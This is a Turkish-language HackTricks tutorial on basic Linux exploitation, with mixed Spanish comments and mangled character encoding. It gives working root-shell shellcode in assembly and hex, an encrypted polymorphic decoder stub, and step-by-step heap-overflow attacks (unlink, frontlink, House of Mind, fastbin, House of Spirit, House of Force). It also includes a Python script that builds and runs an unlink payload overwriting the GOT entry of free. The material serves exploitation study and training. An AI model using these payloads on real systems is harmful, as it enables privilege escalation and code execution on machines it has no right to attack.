# Linux Exploiting (Temel) (TUR)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

- **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
- [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
- **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
- **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **2.SHELLCODE**

Kernel kesmelerini gÃ¶rÃ¼ntÃ¼le: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'Ä± temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§irilecek bir argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Sistem Ã§aÄŸrÄ±sÄ±nÄ± yÃ¼rÃ¼t

**nasm -f elf assembly.asm** â€”> Bir .o dosyasÄ± dÃ¶ndÃ¼rÃ¼r\
**ld assembly.o -o shellcodeout** â€”> DerlenmiÅŸ kodu iÃ§eren yÃ¼rÃ¼tÃ¼lebilir dosyayÄ± verir ve **objdump** ile opcode'larÄ± Ã§Ä±karabiliriz\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcodemuz olduÄŸunu ve opcode'larÄ± Ã§Ä±karmak iÃ§in

**Shellcodenin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± kontrol etmek**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
```markdown
Para doÄŸru sistem Ã§aÄŸrÄ±larÄ±nÄ±n yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in Ã¶nceki program derlenmeli ve sistem Ã§aÄŸrÄ±larÄ± **strace ./DERLENMÄ°Å_PROGRAM** iÃ§inde gÃ¶rÃ¼nmelidir.

Shellcode'lar oluÅŸtururken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya bir sÄ±Ã§rama yapmaktÄ±r. Ã‡aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve ayrÄ±ca EIP'yi yÄ±ÄŸÄ±na yerleÅŸtirir. Ã‡aÄŸrÄ± talimatÄ±ndan sonra ihtiyacÄ±mÄ±z olan dizeyi yerleÅŸtirdik, bu nedenle bu EIP ile dizeyi iÅŸaretleyebilir ve aynÄ± zamanda kodu devam ettirebiliriz.

Ã–R **HÄ°LE (/bin/sh)**:
```
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stack Kullanarak EIP KontrolÃ¼:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Yumurta AvcÄ±sÄ±:**

Bir iÅŸleme iliÅŸkilendirilen bellek sayfalarÄ±nÄ± dolaÅŸarak orada saklanan shellcode'u arayan kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±dÄ±r (shellcode'da yer alan bir imza arar). Kod enjekte etmek iÃ§in sadece kÃ¼Ã§Ã¼k bir alanÄ±n olduÄŸu durumlarda faydalÄ±dÄ±r.

**Polimorfik Shellcode'lar**

KÃ¼Ã§Ã¼k kodlarla ÅŸifrelenmiÅŸ kabuklardÄ±r ve bunlarÄ± Ã§Ã¶zen ve onlara atlayan kÃ¼Ã§Ã¼k kodlar iÃ§erirler, Call-Pop hilesini kullanarak ÅŸifrelenmiÅŸ bir Ã¶rnek ÅŸÃ¶yle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Ek YÃ¶ntemler**













###





## **8 Heap TaÅŸmalarÄ±: Temel SaldÄ±rÄ±lar**

**AyrÄ±lmÄ±ÅŸ ParÃ§a**

prev\_size |\
size | â€”BaÅŸlÄ±k\
\*mem | Veri

**BoÅŸ ParÃ§a**

prev\_size |\
size |\
\*fd | Ä°leri parÃ§a iÅŸaretÃ§isi\
\*bk | Geri parÃ§a iÅŸaretÃ§isi â€”BaÅŸlÄ±k\
\*mem | Veri

BoÅŸ parÃ§alar Ã§ift baÄŸlÄ± bir liste iÃ§indedir (bin) ve hiÃ§bir zaman yan yana iki boÅŸ parÃ§a olamaz (birleÅŸtirilirler).

"size" iÃ§indeki bitler ÅŸunlarÄ± belirtir: Ã–nceki parÃ§a kullanÄ±mda mÄ±, parÃ§a mmap() ile ayrÄ±ldÄ± mÄ± ve parÃ§a ana alana mÄ± ait.

Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, yanÄ±ndaki parÃ§alardan herhangi biri boÅŸsa, bunlar unlink() makrosu aracÄ±lÄ±ÄŸÄ±yla birleÅŸtirilir ve daha bÃ¼yÃ¼k yeni parÃ§a frontlink() e geÃ§irilir ve uygun bin iÃ§ine eklenir.

unlink(){\
BK = P->bk; â€”> Yeni parÃ§anÄ±n BK'sÄ± Ã¶nceden boÅŸ olanÄ±n BK'si olur\
FD = P->fd; â€”> Yeni parÃ§anÄ±n FD'si Ã¶nceden boÅŸ olanÄ±n FD'si olur\
FD->bk = BK; â€”> Sonraki parÃ§anÄ±n BK'sÄ± yeni parÃ§aya iÅŸaret eder\
BK->fd = FD; â€”> Ã–nceki parÃ§anÄ±n FD'si yeni parÃ§aya iÅŸaret eder\
}

Bu nedenle, P->bk'yi bir shellcode'un adresiyle ve P->fd'yi GOT veya DTORS'taki bir giriÅŸin adresi eksi 12 ile deÄŸiÅŸtirebilirsek ÅŸunlar gerÃ§ekleÅŸir:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ve bÃ¶ylece programdan Ã§Ä±karken shellcode Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.

AyrÄ±ca, unlink()'in 4. ifadesi bir ÅŸey yazÄ±yor ve shellcode bunun iÃ§in dÃ¼zeltilmelidir:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Bu, shellcode'un 8. baytÄ±ndan itibaren 4 bayt yazÄ±lmasÄ±na neden olur, bu nedenle shellcode'un ilk talimatÄ± bunu atlamak ve shellcode'un geri kalanÄ±na gitmek iÃ§in bir jmp olmalÄ±dÄ±r.

Bu nedenle, saldÄ±rÄ± ÅŸu ÅŸekilde oluÅŸturulur:

Buffer1'e shellcode eklenir, nops'a veya shellcode'un geri kalanÄ±na dÃ¼ÅŸmesi iÃ§in bir jmp ile baÅŸlar.

Shellcode'un ardÄ±ndan, bir sonraki parÃ§anÄ±n prev\_size ve size alanÄ±na ulaÅŸana kadar doldurma yapÄ±lÄ±r. Bu alanlara 0xfffffff0 (Ã¶nceki parÃ§anÄ±n boÅŸ olduÄŸunu belirten bitin Ã¼zerine yazÄ±lmasÄ±) ve "-4" (0xfffffffc) size'a yazÄ±lÄ±r (3. parÃ§anÄ±n 2. parÃ§anÄ±n gerÃ§ekte boÅŸ olup olmadÄ±ÄŸÄ±nÄ± kontrol ettiÄŸinde, deÄŸiÅŸtirilmiÅŸ prev\_size'a gider) -> Bu ÅŸekilde, free() kontrol ettiÄŸinde 3. parÃ§anÄ±n size'Ä±na gidecek ancak gerÃ§ekte 2. parÃ§anÄ±n - 4'e gidecek ve 2. parÃ§anÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼necek. Ve sonra **unlink()** Ã§aÄŸrÄ±lacak.

unlink() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, P->fd olarak 2. parÃ§anÄ±n ilk verileri kullanÄ±lacaÄŸÄ±ndan, buraya Ã¼zerine yazÄ±lacak adres - 12 olacak (Ã§Ã¼nkÃ¼ FD->bk'da FD'de saklanan adrese 12 ekleyecek). Ve bu adrese, 2. parÃ§ada bulunan ikinci adresi ekleyeceÄŸiz, bu da shellcode'un adresi olacak (sahte P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de doldurma**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Ã–nceki parÃ§anÄ±n boÅŸ olduÄŸunu belirten bitin 1 olmasÄ± Ã¶nemli**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, 3. parÃ§anÄ±n size'Ä±nÄ±n 4 bayt geride olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in (prev\_size'Ä± iÅŸaret eder) Ã§Ã¼nkÃ¼ 2. parÃ§anÄ±n boÅŸ olup olmadÄ±ÄŸÄ±nÄ± kontrol ederken buraya bakar**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da baÅŸta 8 bayt doldurma olacak**

**got\_free = pack("\<I", 0x08048300 - 12) #free() fonksiyonunun adresi plt-12 (shellcode'u Ã§alÄ±ÅŸtÄ±rmak iÃ§in Ã¼zerine yazÄ±lacak adres) **

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload'Ä±n baÅŸÄ±nda 8 bayt doldurma olacak**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parÃ§a deÄŸiÅŸtirilir, got\_free, saklanacak adresin (addr\_sc + 12) nereye iÅŸaret edeceÄŸini gÃ¶sterir**

**os.system("./8.3.o " + payload)**

**unset() (wargame'de) ters sÄ±rada serbest bÄ±rakma**

ÃœÃ§ ardÄ±ÅŸÄ±k parÃ§ayÄ± kontrol ediyoruz ve rezerve edildiÄŸi sÄ±ranÄ±n tersine serbest bÄ±rakÄ±lÄ±yor.

Bu durumda:

c parÃ§asÄ±na shellcode yerleÅŸtirilir

a parÃ§asÄ±nÄ±, a parÃ§asÄ±nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in size'da PREV\_INUSE bitini devre dÄ±ÅŸÄ± bÄ±rakacak ÅŸekilde Ã¼zerine yazmak iÃ§in kullanÄ±rÄ±z.

AyrÄ±ca, b baÅŸlÄ±ÄŸÄ±nda size deÄŸeri -4 olacak ÅŸekilde Ã¼zerine yazÄ±lÄ±r.

Bu durumda, program "a"nÄ±n boÅŸ olduÄŸunu ve bir binde olduÄŸunu dÃ¼ÅŸÃ¼necek ve onu Ã§Ã¶zmek iÃ§in unlink() Ã§aÄŸrÄ±lacak. Ancak, Ã§Ã¼nkÃ¼ baÅŸlÄ±k PREV\_SIZE -4 deÄŸerine sahip, "a" parÃ§asÄ±nÄ±n aslÄ±nda b+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necek. Yani, b+4'te baÅŸlayan bir parÃ§ayÄ± Ã§Ã¶zecek, bu da b+12'de "fd" iÅŸaretÃ§isi ve b+16'da "bk" iÅŸaretÃ§isi olacak.

Bu ÅŸekilde, bk'ya shellcode'un adresini ve fd'ye "puts()" fonksiyonunun adresini -12 olarak koyarsak, payload'Ä±mÄ±z hazÄ±r olur.

**Frontlink TekniÄŸi**

Bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve yanÄ±ndaki parÃ§alar boÅŸ deÄŸilse, unlink() Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() Ã§aÄŸrÄ±lÄ±r.

SaldÄ±rÄ±lan malloc hiÃ§bir zaman serbest bÄ±rakÄ±lmazsa (free()) yararlÄ± bir zayÄ±flÄ±k.

Gereksinimler:

Veri giriÅŸi iÅŸleviyle taÅŸma yapÄ±labilen bir tampon

Bu tampona bitiÅŸik serbest bÄ±rakÄ±lacak ve baÅŸlÄ±k alanÄ±ndaki fd'si taÅŸma tamponundan dolayÄ± deÄŸiÅŸtirilecek bir tampon

512'den bÃ¼yÃ¼k ancak Ã¶nceki tampondan kÃ¼Ã§Ã¼k bir boyuta sahip serbest bÄ±rakÄ±lacak bir tampon

Bu adÄ±mlardan Ã¶nce tanÄ±mlanmÄ±ÅŸ bir tampon, bu sayede iki malloc'a kontrolsÃ¼z bir ÅŸekilde ve biri kontrol edilerek Ã¼zerine yazma yaparak bir saldÄ±rÄ± gerÃ§ekleÅŸtirilebilir.

**Ã‡ift free() ZayÄ±flÄ±ÄŸÄ±**

AynÄ± iÅŸaretÃ§iyle iki kez free() Ã§aÄŸrÄ±lÄ±rsa, aynÄ± adrese iÅŸaret eden iki bin oluÅŸur.

Birini tekrar kullanmak istendiÄŸinde sorunsuzca atanÄ±r. DiÄŸerini kullanmak istendiÄŸinde, aynÄ± alan atanÄ±r, bu da Ã¶nceki rezervasyonun yazacaÄŸÄ± verilerle yanÄ±ltÄ±lmÄ±ÅŸ "fd" ve "bk" iÅŸaretÃ§ilerine sahip olacaÄŸÄ±mÄ±z anlamÄ±na gelir.

**free() SonrasÄ±**

Ã–nceden serbest bÄ±rakÄ±lan bir iÅŸaretÃ§i kontrolsÃ¼z bir ÅŸekilde tekrar kullanÄ±lÄ±r.
## **8 Heap TaÅŸmalarÄ±: Ä°leri DÃ¼zey SaldÄ±rÄ±lar**

Unlink() ve FrontLink() teknikleri, unlink() fonksiyonu deÄŸiÅŸtirilerek kaldÄ±rÄ±ldÄ±.

**Zihin Evi**

Kodun keyfi olarak yÃ¼rÃ¼tÃ¼lmesini saÄŸlamak iÃ§in sadece bir free() Ã§aÄŸrÄ±sÄ± gereklidir. Bir Ã¶nceki parÃ§ayÄ± taÅŸÄ±mak ve serbest bÄ±rakmak iÃ§in taÅŸan bir ikinci parÃ§a aramak Ã¶nemlidir.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) fonksiyonunu Ã§aÄŸÄ±rÄ±r, bu fonksiyon:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> ParÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adresi (mem-8) dÃ¶ndÃ¼rÃ¼r

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1] kÄ±smÄ±nda, NON\_MAIN\_ARENA bitini kontrol eder, bu biti deÄŸiÅŸtirerek kontrolÃ¼n true dÃ¶nmesini saÄŸlayabilir ve heap\_for\_ptr() fonksiyonunu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu iÅŸlem, "mem" Ã¼zerinde bir and iÅŸlemi yaparak en az Ã¶nemli 2.5 baytÄ± sÄ±fÄ±rlar (Ã¶rneÄŸin, 0x0804a000 adresinde 0x08000000 bÄ±rakÄ±r) ve 0x08000000->ar\_ptr adresine eriÅŸir (struct heap\_info gibi).

Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000 adresinde bir parÃ§ayÄ± kontrol edebilir ve **0x081002a0** adresinde bir parÃ§a serbest bÄ±rakÄ±lacaksa 0x08100000 adresine ulaÅŸabilir ve istediÄŸimizi yazabiliriz, Ã¶rneÄŸin **0x0804a000**. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap\_for\_ptr(ptr)->ar\_ptr'nin 0x08100000 adresine yazdÄ±ÄŸÄ±mÄ±zÄ± gÃ¶recektir (Ã§Ã¼nkÃ¼ Ã¶nceki and iÅŸlemi uygulanÄ±r ve buradan ilk 4 baytÄ±n deÄŸeri, yani ar\_ptr alÄ±nÄ±r).

Bu ÅŸekilde \_int\_free(ar\_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Daha Ã¶nce gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi av deÄŸerini kontrol edebiliriz, Ã§Ã¼nkÃ¼ serbest bÄ±rakÄ±lacak parÃ§aya yazdÄ±ÄŸÄ±mÄ±z deÄŸerdir.

unsorted\_chunks fonksiyonunun tanÄ±mÄ±na gÃ¶re biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle av->bins\[2] adresine \_\_DTOR\_END\_\_-12 adresini yazarsak, son komutta \_\_DTOR\_END\_\_ adresine ikinci parÃ§anÄ±n adresi yazÄ±lacaktÄ±r.

Yani, ilk parÃ§aya \_\_DTOR\_END\_\_-12 adresini baÅŸa birÃ§ok kez koymamÄ±z gerekiyor, Ã§Ã¼nkÃ¼ av->bins\[2] buradan deÄŸeri alacak.

Ä°kinci parÃ§ada ve birinci parÃ§anÄ±n yardÄ±mÄ±yla prev\_size'a bir 0x0c atamasÄ± ve size'a -> NON\_MAIN\_ARENA'Ä± etkinleÅŸtirmek iÃ§in bir deÄŸer yazÄ±yoruz.

Sonra, parÃ§a 2'ye bir sÃ¼rÃ¼ nops ve sonunda shellcode ekliyoruz.

Bu ÅŸekilde \_int\_free(TROZO1, TROZO2) Ã§aÄŸrÄ±lacak ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazÄ±lacak ve shellcode'a atlayacak.

Bu tekniÄŸi uygulamak iÃ§in payload'u biraz daha karmaÅŸÄ±k hale getiren bazÄ± gereksinimlerin karÅŸÄ±lanmasÄ± gerekmektedir.

Bu teknik artÄ±k uygulanamaz Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yama uygulandÄ±. Yeni hedefin de kendisine iÅŸaret edilip edilmediÄŸi kontrol edilir.

**Fastbin**

Zihin Evi'nin bir varyantÄ±dÄ±r

Ä°lk \_int\_free() fonksiyonunun ilk kontrolÃ¼nden sonra ulaÅŸÄ±lan kodu yÃ¼rÃ¼tmek istiyoruz.

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Bu ÅŸekilde, "fb" adresi GOT'taki bir fonksiyonun adresini gÃ¶steriyorsa, bu adrese Ã¼zerine yazÄ±lacak olan parÃ§a adresi konulacaktÄ±r. Bunun iÃ§in arenanÄ±n dtor adreslerine yakÄ±n olmasÄ± gerekmektedir. Daha doÄŸrusu, av->max\_fast'in Ã¼zerine yazÄ±lacak olan adreste olmasÄ± gerekmektedir.

Zihin Evi ile arenanÄ±n konumunu kontrol edebileceÄŸimizi gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z iÃ§in.

Bu durumda, size alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu yazarsak, fastbin\_index() bize fastbins\[-1] adresini dÃ¶ndÃ¼recektir, bu da av->max\_fast adresine iÅŸaret edecektir.

Bu durumda av->max\_fast Ã¼zerine yazÄ±lacak (iÅŸaret edilen deÄŸil, Ã¼zerine yazÄ±lacak olan) adres olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 8 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut yazmamÄ±z yeterlidir (ayrÄ±ca shellcode'un serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nerek, sahte yeni parÃ§anÄ±n boyut alanÄ±na atlamak iÃ§in bir jmp koymamÄ±z gerekecektir).

AyrÄ±ca, bu sahte parÃ§a av->system\_mem'den kÃ¼Ã§Ã¼k olmalÄ±dÄ±r. av->system\_mem, bu konumdan 1848 bayt uzakta bulunmaktadÄ±r.

\_DTOR\_END\_ ve GOT'taki az sayÄ±da adres nedeniyle, bu bÃ¶lÃ¼mlerin hiÃ§biri Ã¼zerine yazÄ±lacak uygun bir adres deÄŸildir, bu yÃ¼zden pili hedeflemek iÃ§in fastbin'i nasÄ±l kullanacaÄŸÄ±mÄ±za bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± ÅŸekli, **av**'yi pile yÃ¶nlendirmektir.

Size deÄŸerini 8 yerine 16 yaparsak: fastbin\_index() bize fastbins\[0] dÃ¶ndÃ¼recektir ve bunu kullanarak pile yazabiliriz.

Bunun iÃ§in pile canary veya garip deÄŸerler olmamalÄ±dÄ±r, aslÄ±nda ÅŸu ÅŸekilde olmalÄ±dÄ±r: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adreste olacaÄŸÄ± ve bir **av**'nin ilk Ã¶ÄŸesinin 0 olmasÄ± gerektiÄŸi anlamÄ±na gelir.

**av->max\_fast**, EBP olacak ve bizi kÄ±sÄ±tlamalardan geÃ§irecek bir deÄŸer olacak.

**av->fastbins\[0]** adresi **p**'nin adresiyle Ã¼zerine yazÄ±lacak ve RET olacak, bÃ¶ylece shellcode'a atlanacak.

AyrÄ±ca, **av->system\_mem** (pile gÃ¶re 1484 bayt yukarÄ±da) Ã¼zerinde, kontrolÃ¼ atlamamÄ±za izin verecek birÃ§ok Ã§Ã¶p olacaktÄ±r.

Serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 16 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut yazmamÄ±z yeterlidir (ayrÄ±ca shellcode'un serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nerek, sahte yeni parÃ§anÄ±n boyut alanÄ±na atlamak iÃ§in bir jmp koymamÄ±z gerekecektir).

**Ruh Evi**

Bu durumda, saldÄ±rganÄ±n deÄŸiÅŸtirebileceÄŸi bir malloc iÅŸaretÃ§isine sahip olmak istiyoruz (Ã¶rneÄŸin, iÅŸaretÃ§inin bir deÄŸiÅŸken Ã¼zerindeki taÅŸmaya iÅŸaret ettiÄŸi yÄ±ÄŸÄ±nda olmasÄ±).

BÃ¶ylece, bu iÅŸaretÃ§iyi istediÄŸimiz yere iÅŸaret edecek ÅŸekilde yapabiliriz. Ancak, herhangi bir yer uygun deÄŸildir, sahte parÃ§anÄ±n boyutu av->max\_fast'tan kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak gelecekteki bir malloc() Ã§aÄŸrÄ±sÄ±nda talep edilen boyuta 8 eklenmelidir. Bu nedenle, bu savunmasÄ±z iÅŸaretÃ§iden sonra bir malloc(40) Ã§aÄŸrÄ±lacaÄŸÄ±nÄ± biliyorsak, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.
```markdown
Si Ã¶rneÄŸin program kullanÄ±cÄ±dan bir sayÄ± istiyorsa, 48 girebilir ve deÄŸiÅŸtirilebilir malloc iÅŸaretÃ§isini (ÅŸans eseri EBP'ye ait olabilecek 4 bayt sonrasÄ±na) iÅŸaretleyebiliriz, bÃ¶ylece 48 geride kalÄ±r, sanki baÅŸlÄ±k boyutu gibi. AyrÄ±ca, ptr-4+48 adresinin birkaÃ§ koÅŸulu karÅŸÄ±lamasÄ± gerekir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system_mem olmalÄ±dÄ±r.

Bu koÅŸul saÄŸlandÄ±ÄŸÄ±nda, sÃ¶ylediÄŸimiz gibi malloc(40) Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, EBP'nin adresi olarak EBP'nin adresi atanÄ±r. SaldÄ±rganÄ±n bu malloc'ta ne yazÄ±lacaÄŸÄ±nÄ± da kontrol edebilmesi durumunda hem EBP hem de EIP'nin istediÄŸi adrese yazÄ±labilir.

Bunu, free() iÅŸlevi Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, yeni malloc() iÃ§in rezerve edilmek istenen mÃ¼kemmel boyutta bir parÃ§a olduÄŸunu kaydedeceÄŸi iÃ§in yapar, bu nedenle o adrese atanÄ±r.

**The House of Force**

Gerekli olanlar:

* Wilderness'Ä± Ã¼zerine yazabileceÄŸimiz bir parÃ§a taÅŸma
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan verilere sahip bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) deÄŸiÅŸtiririz, bÃ¶ylece yeterince bÃ¼yÃ¼k bir bellek isteÄŸi \_int\_malloc() iÃ§inde heap'i geniÅŸletmeden iÅŸlenecektir.

Ä°kincisi, av->top'un saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek bÃ¶lgesine, Ã¶rneÄŸin stack'e, iÅŸaret etmesini saÄŸlamak iÃ§in av->top'u deÄŸiÅŸtiririz. av->top'a \&EIP - 8 konulur.

SaldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek bÃ¶lgesine iÅŸaret eden av->top'u deÄŸiÅŸtirmemiz gerekmektedir:

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresini (mevcut av->top) alÄ±r ve kalan tam olarak bu adresin malloc() tarafÄ±ndan talep edilen bayt sayÄ±sÄ± ile toplamÄ±dÄ±r. DolayÄ±sÄ±yla, \&EIP-8 0xbffff224 adresindeyse ve av->top 0x080c2788 adresini iÃ§eriyorsa, av->top'un bir sonraki malloc() iÃ§in \&EIP-8'e iÅŸaret etmesini istediÄŸimizde kontrol edilen malloc iÃ§in rezerve edilmesi gereken bayt miktarÄ± ÅŸudur:

0xbffff224 - 0x080c2788 = 3086207644.

